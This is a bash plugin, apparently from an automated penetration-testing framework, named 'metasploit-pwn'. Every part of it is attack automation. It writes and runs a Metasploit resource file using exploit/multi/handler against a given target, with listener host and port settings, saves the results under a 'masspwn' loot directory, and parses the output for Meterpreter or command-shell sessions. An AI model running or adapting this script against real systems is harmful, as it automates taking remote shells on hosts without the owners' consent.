PLUGIN_NAME="metasploit-pwn"

plugin_init() {
  command -v msfconsole &>/dev/null
}

plugin_run() {
  local target="$1"
  local outdir="$LOOT_DIR/exploits/masspwn"
  mkdir -p "$outdir"
  local rc="$outdir/msf-pwn-$target.rc"
  cat > "$rc" <<EOF
use exploit/multi/handler
set RHOSTS $target
set LHOST ${MSF_LHOST:-127.0.0.1}
set LPORT ${MSF_LPORT:-4444}
run
exit
EOF
  msfconsole -q -r "$rc" 2>/dev/null | tee "$outdir/msf-pwn-$target.txt" >/dev/null
}

plugin_parse_output() {
  local result_file="$1"
  grep -E "Meterpreter|session opened|Command shell" "$result_file" 2>/dev/null || true
}
